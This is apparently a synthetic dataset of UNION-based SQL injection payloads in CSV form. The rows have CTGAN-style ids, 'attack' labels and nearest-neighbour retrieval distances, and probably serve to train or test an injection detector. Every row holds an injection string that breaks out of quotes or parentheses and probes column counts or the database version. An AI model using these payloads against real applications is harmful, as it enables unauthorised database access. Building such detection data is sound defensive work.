id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,union,"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#",nearest_attack_euclidean,R000161,5.319099379450078
CTGAN_000002,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000166,5.312072231908043
CTGAN_000003,attack,union,"-6007""   )    )    union all select 6019,6019,6019,6019,6019,6019,6019,6019--",nearest_attack_euclidean,R000158,5.1423289474324765
CTGAN_000004,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000252,5.17916464071839
CTGAN_000005,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000088,6.715344678126237
CTGAN_000006,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000163,4.901238338077946
CTGAN_000007,attack,union," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",nearest_attack_euclidean,R000019,6.934495413675505
CTGAN_000008,attack,union,"1'   )    )    as tgso where 1349  =  1349 union all select null,null,null,null--",nearest_attack_euclidean,R000268,7.011433784958865
CTGAN_000009,attack,union,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",nearest_attack_euclidean,R000106,5.7525121613854076
CTGAN_000010,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000171,10.157844811942361
CTGAN_000011,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000273,5.04959516821707
CTGAN_000012,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000289,7.459254232160783
CTGAN_000013,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000289,6.6978638233907555
CTGAN_000014,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000302,6.04759751344176
CTGAN_000015,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000055,7.075122118247147
CTGAN_000016,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000088,5.4035813454661055
CTGAN_000017,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000166,5.246379768489405
CTGAN_000018,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000166,6.180817791550824
CTGAN_000019,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000048,5.159922442060818
CTGAN_000020,attack,union,"-2821""   )    )     )   union all select 3920,3920,3920,3920,3920,3920,3920#",nearest_attack_euclidean,R000217,5.197022231042159
CTGAN_000021,attack,union,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",nearest_attack_euclidean,R000139,5.628255991719713
CTGAN_000022,attack,union,"-7678   )    )     )   union all select 2622,2622,2622,2622,2622,2622,2622,2622--",nearest_attack_euclidean,R000244,5.9685998734218835
